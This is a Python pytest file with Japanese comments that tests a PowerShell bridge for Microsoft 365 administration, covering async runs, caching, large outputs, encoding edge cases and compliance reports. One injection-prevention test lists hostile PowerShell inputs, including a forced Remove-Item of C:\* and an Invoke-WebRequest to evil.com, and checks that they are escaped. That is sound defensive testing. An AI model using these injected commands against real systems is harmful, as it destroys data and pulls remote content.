"""
高度なシナリオテスト
非同期実行、パフォーマンス、エッジケースのテスト
"""

import pytest
import asyncio
import time
import json
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime, timedelta

from src.core.powershell_bridge import (
    PowerShellBridge, 
    PowerShellResult,
    PowerShellCompatibilityLayer
)


class TestAsyncOperations:
    """非同期操作のテスト"""
    
    @pytest.mark.asyncio
    async def test_concurrent_command_execution(self, bridge, mock_subprocess):
        """並行コマンド実行のテスト"""
        # 異なる実行時間をシミュレート
        execution_times = [0.1, 0.2, 0.15, 0.05]
        results_data = [
            {"id": 1, "data": "result1"},
            {"id": 2, "data": "result2"},
            {"id": 3, "data": "result3"},
            {"id": 4, "data": "result4"}
        ]
        
        def mock_run(*args, **kwargs):
            # コマンドから実行時間を決定
            cmd_str = str(args[0])
            if "command1" in cmd_str:
                time.sleep(execution_times[0])
                return Mock(returncode=0, stdout=json.dumps(results_data[0]), stderr="")
            elif "command2" in cmd_str:
                time.sleep(execution_times[1])
                return Mock(returncode=0, stdout=json.dumps(results_data[1]), stderr="")
            elif "command3" in cmd_str:
                time.sleep(execution_times[2])
                return Mock(returncode=0, stdout=json.dumps(results_data[2]), stderr="")
            else:
                time.sleep(execution_times[3])
                return Mock(returncode=0, stdout=json.dumps(results_data[3]), stderr="")
        
        mock_subprocess.side_effect = mock_run
        
        # 非同期で複数コマンドを実行
        start_time = time.time()
        tasks = [
            bridge.execute_command_async("command1"),
            bridge.execute_command_async("command2"),
            bridge.execute_command_async("command3"),
            bridge.execute_command_async("command4")
        ]
        
        results = await asyncio.gather(*tasks)
        end_time = time.time()
        
        # 結果の検証
        assert len(results) == 4
        assert all(r.success for r in results)
        assert results[0].data["id"] == 1
        assert results[1].data["id"] == 2
        
        # 並行実行されていることを確認（全体時間が最長の実行時間程度）
        total_time = end_time - start_time
        assert total_time < sum(execution_times)  # 順次実行より速い
    
    @pytest.mark.asyncio
    async def test_async_batch_with_errors(self, bridge, mock_subprocess):
        """エラーを含む非同期バッチ実行"""
        mock_subprocess.side_effect = [
            Mock(returncode=0, stdout='{"success": true}', stderr=""),
            Mock(returncode=1, stdout="", stderr='{"Message": "Error occurred"}'),
            Mock(returncode=0, stdout='{"success": true}', stderr=""),
        ]
        
        commands = ["cmd1", "cmd2", "cmd3"]
        results = await bridge.execute_batch_async(commands)
        
        assert len(results) == 3
        assert results[0].success is True
        assert results[1].success is False
        assert results[2].success is True
        assert "Error occurred" in results[1].error_message
    
    @pytest.mark.asyncio
    async def test_async_timeout_handling(self, bridge, mock_subprocess):
        """非同期タイムアウト処理のテスト"""
        def slow_command(*args, **kwargs):
            time.sleep(5)  # タイムアウトより長い
            return Mock(returncode=0, stdout="", stderr="")
        
        mock_subprocess.side_effect = slow_command
        
        with pytest.raises(asyncio.TimeoutError):
            await asyncio.wait_for(
                bridge.execute_command_async("slow-command", timeout=1),
                timeout=2
            )


class TestPerformanceScenarios:
    """パフォーマンスシナリオのテスト"""
    
    def test_command_caching(self, bridge, mock_subprocess):
        """コマンドキャッシングのテスト"""
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout='{"cached": true}',
            stderr=""
        )
        
        # 同じモジュールを複数回インポート
        for _ in range(5):
            result = bridge.import_module("TestModule")
        
        # キャッシュが効いているか確認（呼び出し回数が少ない）
        # 初期化時の1回 + インポート時の1回のみ
        assert mock_subprocess.call_count <= 2
    
    def test_large_output_handling(self, bridge, mock_subprocess):
        """大量出力データの処理テスト"""
        # 10MBのJSONデータを生成
        large_data = {
            "users": [
                {
                    "id": f"user-{i:06d}",
                    "displayName": f"User {i:06d}",
                    "description": "A" * 1000  # 1KBの説明文
                }
                for i in range(10000)  # 10,000ユーザー
            ]
        }
        
        large_json = json.dumps(large_data)
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout=large_json,
            stderr=""
        )
        
        start_time = time.time()
        result = bridge.execute_command("Get-LargeDataset")
        end_time = time.time()
        
        assert result.success
        assert len(result.data["users"]) == 10000
        assert end_time - start_time < 5  # 5秒以内に処理完了
    
    def test_memory_efficient_streaming(self, bridge, mock_subprocess, tmp_path):
        """メモリ効率的なストリーミング処理"""
        # 大量のCSVデータをシミュレート
        csv_path = tmp_path / "large_data.csv"
        
        # ヘッダーを書き込み
        with open(csv_path, 'w', encoding='utf-8-sig') as f:
            f.write("Id,DisplayName,Email,Department\n")
            # 100,000行のデータ
            for i in range(100000):
                f.write(f"{i},User{i},user{i}@example.com,Dept{i%100}\n")
        
        # ストリーミング読み込みコマンド
        command = f"Get-Content '{csv_path}' -ReadCount 1000"
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout=f"Processed {csv_path}",
            stderr=""
        )
        
        result = bridge.execute_command(command, return_json=False, timeout=60)
        assert result.success
    
    def test_parallel_batch_performance(self, bridge, mock_subprocess):
        """並列バッチ実行のパフォーマンステスト"""
        commands = [f"Get-Process -Name 'process{i}'" for i in range(20)]
        
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout='{"name": "process", "id": 1234}',
            stderr=""
        )
        
        # 順次実行
        start_time = time.time()
        sequential_results = bridge.execute_batch(commands, parallel=False)
        sequential_time = time.time() - start_time
        
        # 並列実行
        start_time = time.time()
        parallel_results = bridge.execute_batch(commands, parallel=True)
        parallel_time = time.time() - start_time
        
        assert len(sequential_results) == len(parallel_results) == 20
        assert all(r.success for r in sequential_results)
        assert all(r.success for r in parallel_results)
        
        # 並列実行の方が速いことを期待（ただしオーバーヘッドもあるため僅差の可能性）
        print(f"Sequential: {sequential_time:.3f}s, Parallel: {parallel_time:.3f}s")


class TestEdgeCases:
    """エッジケースのテスト"""
    
    def test_empty_response_handling(self, bridge, mock_subprocess):
        """空のレスポンス処理"""
        test_cases = [
            ("", False, ""),  # 完全に空
            ("   ", False, "   "),  # 空白のみ
            ("\n\n", False, "\n\n"),  # 改行のみ
            ("null", True, None),  # JSON null
            ("[]", True, []),  # 空配列
            ("{}", True, {}),  # 空オブジェクト
        ]
        
        for stdout, use_json, expected_data in test_cases:
            mock_subprocess.return_value = Mock(
                returncode=0,
                stdout=stdout,
                stderr=""
            )
            
            result = bridge.execute_command("test-command", return_json=use_json)
            assert result.success
            
            if use_json and stdout.strip() and stdout.strip() != "null":
                assert result.data == expected_data
            elif use_json and stdout.strip() == "null":
                assert result.data is None
            else:
                assert result.data == stdout or result.data is None
    
    def test_malformed_json_recovery(self, bridge, mock_subprocess):
        """不正なJSON形式からの回復"""
        malformed_outputs = [
            '{"incomplete": "json"',  # 閉じていない
            '{"key": undefined}',  # 未定義値
            "{'single': 'quotes'}",  # シングルクォート
            '{"trailing": "comma",}',  # 末尾カンマ
            'Just plain text',  # JSONではない
        ]
        
        for malformed in malformed_outputs:
            mock_subprocess.return_value = Mock(
                returncode=0,
                stdout=malformed,
                stderr=""
            )
            
            result = bridge.execute_command("test-command", return_json=True)
            assert result.success
            assert result.data == malformed  # 生データとして保存
    
    def test_concurrent_module_import(self, bridge, mock_subprocess):
        """並行モジュールインポートのテスト"""
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")
        
        # 複数スレッドから同時にモジュールをインポート
        import_results = []
        threads = []
        
        def import_module():
            result = bridge.import_module("ConcurrentModule")
            import_results.append(result)
        
        for _ in range(5):
            thread = threading.Thread(target=import_module)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # 全てのインポートが成功
        assert all(import_results)
        assert len(import_results) == 5
    
    def test_recursive_data_structure(self, bridge):
        """再帰的データ構造の処理"""
        # 深くネストされた構造
        nested_data = {"level": 1}
        current = nested_data
        for i in range(2, 101):  # 100レベルの深さ
            current["child"] = {"level": i}
            current = current["child"]
        
        # PowerShell形式への変換（深さ制限なし）
        result = bridge._convert_ps_to_python(nested_data)
        
        # 構造が保持されているか確認
        assert result["level"] == 1
        current = result
        for i in range(2, 101):
            assert current["child"]["level"] == i
            current = current["child"]
    
    def test_special_powershell_objects(self, bridge, mock_subprocess):
        """特殊なPowerShellオブジェクトの処理"""
        special_objects = {
            # SecureString（パスワード等）
            "SecureString": {
                "@odata.type": "#System.Security.SecureString",
                "Length": 12
            },
            # PSCredential
            "PSCredential": {
                "@odata.type": "#System.Management.Automation.PSCredential",
                "UserName": "admin@contoso.com",
                "Password": "[PROTECTED]"
            },
            # ScriptBlock
            "ScriptBlock": {
                "@odata.type": "#System.Management.Automation.ScriptBlock",
                "Ast": "{ Get-Date }",
                "IsFilter": False
            }
        }
        
        for obj_type, obj_data in special_objects.items():
            mock_subprocess.return_value = Mock(
                returncode=0,
                stdout=json.dumps(obj_data),
                stderr=""
            )
            
            result = bridge.execute_command(f"Get-{obj_type}")
            assert result.success
            assert result.data["@odata.type"] == obj_data["@odata.type"]
    
    def test_session_persistence(self, bridge, mock_subprocess):
        """セッション永続性のテスト"""
        # セッション作成
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout="session-12345",
            stderr=""
        )
        
        assert bridge.create_persistent_session()
        assert bridge._session_id == "session-12345"
        
        # セッション内でコマンド実行
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout='{"inSession": true}',
            stderr=""
        )
        
        result = bridge.execute_command("Get-Variable")
        assert result.success
        assert result.data["inSession"] is True
        
        # クリーンアップ
        bridge.cleanup()
        assert bridge._persistent_session is None
    
    def test_encoding_edge_cases(self, bridge, mock_subprocess):
        """エンコーディングのエッジケース"""
        edge_cases = [
            "Hello\x00World",  # NULL文字
            "Line1\r\nLine2\rLine3\nLine4",  # 各種改行
            "Tab\tSeparated\tValues",  # タブ
            "Emoji: 😀🎉🌍",  # 絵文字
            "数学記号: ∑∏∫∞",  # 数学記号
            "制御文字: \x01\x02\x03",  # 制御文字
            "サロゲートペア: 𠮷野家",  # サロゲートペア
        ]
        
        for test_string in edge_cases:
            mock_subprocess.return_value = Mock(
                returncode=0,
                stdout=json.dumps({"text": test_string}, ensure_ascii=False),
                stderr=""
            )
            
            result = bridge.execute_command("Get-SpecialText")
            assert result.success
            assert result.data["text"] == test_string
    
    def test_error_recovery_scenarios(self, bridge, mock_subprocess):
        """エラー回復シナリオのテスト"""
        # 一時的なエラー後に成功
        mock_subprocess.side_effect = [
            Mock(returncode=1, stdout="", stderr="Temporary network error"),
            Mock(returncode=1, stdout="", stderr="Service temporarily unavailable"),
            Mock(returncode=0, stdout='{"recovered": true}', stderr="")
        ]
        
        result = bridge.execute_with_retry("Get-Data", timeout=5)
        
        assert result.success
        assert result.data["recovered"] is True
        assert mock_subprocess.call_count == 4  # 初期化 + 3回の実行
    
    def test_command_injection_prevention(self, bridge, mock_subprocess):
        """コマンドインジェクション防止のテスト"""
        # 危険な入力
        dangerous_inputs = [
            "'; Remove-Item -Path C:\\* -Force; '",
            "$(Invoke-WebRequest http://evil.com)",
            "`nInvoke-Expression 'malicious code'",
            "& { Start-Process calc.exe }",
            "$null; Stop-Computer -Force"
        ]
        
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout='{"safe": true}',
            stderr=""
        )
        
        for dangerous_input in dangerous_inputs:
            # パラメータとして渡す（安全にエスケープされるべき）
            result = bridge.call_function("Test-Function", UserInput=dangerous_input)
            
            # コマンドが適切にエスケープされているか確認
            call_args = str(mock_subprocess.call_args)
            # 危険なコマンドが実行されないようエスケープされている
            assert "Remove-Item -Path C:\\" not in call_args.replace("\\\\", "\\")
            assert "Invoke-WebRequest http://evil.com" not in call_args
            assert "Stop-Computer -Force" not in call_args


class TestRealWorldScenarios:
    """実際の使用シナリオのテスト"""
    
    def test_daily_report_generation(self, bridge, mock_subprocess, mock_m365_users, mock_m365_licenses):
        """日次レポート生成シナリオ"""
        # 複数のデータソースから情報を収集
        mock_subprocess.side_effect = [
            Mock(returncode=0, stdout=json.dumps(mock_m365_users), stderr=""),
            Mock(returncode=0, stdout=json.dumps(mock_m365_licenses), stderr=""),
            Mock(returncode=0, stdout='{"signIns": 1234}', stderr=""),
            Mock(returncode=0, stdout='{"incidents": 0}', stderr="")
        ]
        
        # レポート用データ収集
        users = bridge.get_users()
        licenses = bridge.get_licenses()
        signins = bridge.execute_command("Get-MgAuditLogSignIn -Top 1 | Measure-Object | Select-Object Count")
        incidents = bridge.execute_command("Get-SecurityIncidents -Last24Hours")
        
        # 全データが正常に取得できたか確認
        assert users.success and users.data["@odata.count"] == 3
        assert licenses.success and len(licenses.data["value"]) == 2
        assert signins.success and signins.data["signIns"] == 1234
        assert incidents.success and incidents.data["incidents"] == 0
    
    def test_license_optimization_workflow(self, bridge, mock_subprocess, mock_m365_users, mock_m365_licenses):
        """ライセンス最適化ワークフロー"""
        # ステップ1: 現在のライセンス状況を取得
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout=json.dumps(mock_m365_licenses),
            stderr=""
        )
        licenses = bridge.get_licenses()
        
        # ステップ2: 未使用ライセンスを特定
        total_licenses = sum(lic["prepaidUnits"]["enabled"] for lic in licenses.data["value"])
        used_licenses = sum(lic["consumedUnits"] for lic in licenses.data["value"])
        unused_licenses = total_licenses - used_licenses
        
        assert unused_licenses == 7  # (25+10) - (23+5) = 7
        
        # ステップ3: 非アクティブユーザーを検索
        inactive_users_cmd = "Get-MgUser -Filter \"accountEnabled eq false\" -ConsistencyLevel eventual"
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout='{"value": [{"displayName": "Inactive User", "assignedLicenses": [{"skuId": "123"}]}]}',
            stderr=""
        )
        
        inactive_result = bridge.execute_command(inactive_users_cmd)
        assert inactive_result.success
        assert len(inactive_result.data["value"]) == 1
    
    def test_security_compliance_check(self, bridge, mock_subprocess, mock_mfa_status, mock_conditional_access_policies):
        """セキュリティコンプライアンスチェック"""
        # MFA状況確認
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout=json.dumps(mock_mfa_status),
            stderr=""
        )
        
        mfa_result = bridge.execute_command("Get-MFAStatus")
        non_mfa_users = [u for u in mfa_result.data if not u["isMfaRegistered"]]
        assert len(non_mfa_users) == 1  # 山田次郎
        
        # 条件付きアクセスポリシー確認
        mock_subprocess.return_value = Mock(
            returncode=0,
            stdout=json.dumps(mock_conditional_access_policies),
            stderr=""
        )
        
        ca_result = bridge.execute_command("Get-MgIdentityConditionalAccessPolicy")
        enabled_policies = [p for p in ca_result.data["value"] if p["state"] == "enabled"]
        assert len(enabled_policies) == 2
        
        # コンプライアンススコア計算
        compliance_score = {
            "mfa_coverage": (len(mfa_result.data) - len(non_mfa_users)) / len(mfa_result.data) * 100,
            "ca_policies_enabled": len(enabled_policies),
            "overall_status": "良好" if len(non_mfa_users) == 0 else "要改善"
        }
        
        assert compliance_score["mfa_coverage"] == 66.67  # 2/3 = 66.67%
        assert compliance_score["overall_status"] == "要改善"